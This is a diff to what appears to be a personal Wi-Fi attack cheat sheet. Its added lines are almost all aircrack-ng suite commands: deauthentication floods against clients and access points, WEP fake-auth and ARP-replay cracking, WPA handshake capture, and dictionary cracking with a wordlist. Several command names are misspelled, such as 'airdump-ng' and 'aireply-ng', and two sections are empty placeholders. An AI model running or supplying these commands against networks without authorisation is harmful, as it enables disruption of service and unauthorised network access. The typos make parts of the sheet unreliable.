@@ -10,14 +10,14 @@ airodump-ng <interface> --wps --manufacturer --uptime --band <band>
 
 ### Monitor target AP
 ```
-airodump-ng <interface> --wps --manufacturer --uptime --band <band> -c <channel> --bssid <bssid> -w res
+airodump-ng <interface> --wps --manufacturer --uptime --band <band> -c <channel> --bssid <bssid> -w <capture>
 ```
 ### Unhide ESSID
 Set channel
 ```
 iwconfig wlan0 channel <channel>
 ```
-Catch beacon with ESSID
+Catch beacon with ESSID (Hiden ESSID)
 ```
 aireplay-ng -0 <deauth number> -a <AP MAC> <interface> 
 aireplay-ng -0 <deauth number> -a <AP MAC> -c <Client MAC> <interface> #Some clients ignore broadcast deauthentications. If this is the case, you will need to send a deauthentication directed at the particular client.
@@ -25,6 +25,18 @@ aireplay-ng -0 <deauth number> -a <AP MAC> -c <Client MAC> <interface> #Some cli
 
 
 ## WEP attack
+
+### Attack using Fake auth and ARP-replay (OPN)
+```
+sudo aireplay-ng -1 6000 -a <AP_MAC> -o 1 -q 10 -h <host_MAC> <interface> # Fake auth
+sudo aireplay-ng -3 -b <AP_MAC> -h <host_MAC> <interface> # ARP replay
+aircrack-ng <*.cap>
+```
+
+## Bypassing WEP (SKA)
+```
+
+```
 
 
 ## WPS attack
@@ -56,7 +68,15 @@ reaver -i <interface> -b <AP_MAC> -p "" -N
 ```
 
 ## WPA attack
+### Handshake Capture (req. client) & Cracking
+```
+airdump-ng -c <channel> --bssid <AP_MAC> -w <capture> <interface>
+aircrack-ng -a 2 -b <AP_MAC> -w <wordlist> <capture>
+```
+### PMKID Capture (client-less) & Cracking
+```
 
+```
 
 ## WPA Enterprise
 
@@ -103,10 +123,16 @@ ip link set dev <interface> up
 ```
 airmon-ng check kill
 airmon-ng start <interface>
+OR
+iw dev <interface> set monitor none
 ```
 ### Back to normal modee (Managed mode)
 ```
 airmon-ng stop <Monitor interface>
 systemctl start wpa_supplicant
 systemctl start NetworkManager
+```
+### No associated devices
+```
+aireply-ng -0 100 -e <ESSID> <interface>
 ```
